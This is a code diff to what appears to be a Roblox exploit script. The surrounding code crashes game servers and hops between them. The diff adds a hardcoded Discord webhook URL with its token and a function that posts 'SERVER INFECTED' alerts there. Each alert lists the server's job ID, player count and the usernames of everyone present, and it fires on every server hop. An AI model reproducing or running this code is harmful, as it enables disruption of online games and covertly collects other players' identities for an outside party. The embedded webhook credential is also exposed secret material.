@@ -1,4 +1,5 @@
 HttpService = game:GetService("HttpService")
+getgenv().BRUH = "https://discord.com/api/webhooks/1550842994494672906/" .. "aQyjLSgtuCIip9T-e1_vnXIRGQn0wOm4jyeEOGVmabCeu4e8shvmPae-npVGe8LvCWca"
 PlaceId = game.PlaceId
 TeleportService = game:GetService("TeleportService")
 Players = game.Players
@@ -9,10 +10,37 @@ local alts = {}
 local serverhop = true -- MOVING TO NEXT SERVER AFTER CRASHING
 -------------------
 
+local function SendWebhook()
+coroutine.wrap(function()
+        local HttpService = game:GetService("HttpService")
+        local players = {}
+    
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            table.insert(players, player.Name)
+        end
+    
+        local content = "🚨 SERVER INFECTED 🚨\n"
+        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
+        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
+        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
+    
+        http.request({
+            Url = BRUH,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "@everyone " .. content .. " ".. game.JobId,
+                username = game.Players.LocalPlayer.Name .. " +1 Credits"
+            })
+        })
+    end)()
+end
+
 if serverhop then
 getgenv().ServerHop = function()
-coroutine.wrap(function()
-end)()
+     SendWebhook()
 local servers = {}
 	local req = game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
 	local body = HttpService:JSONDecode(req)
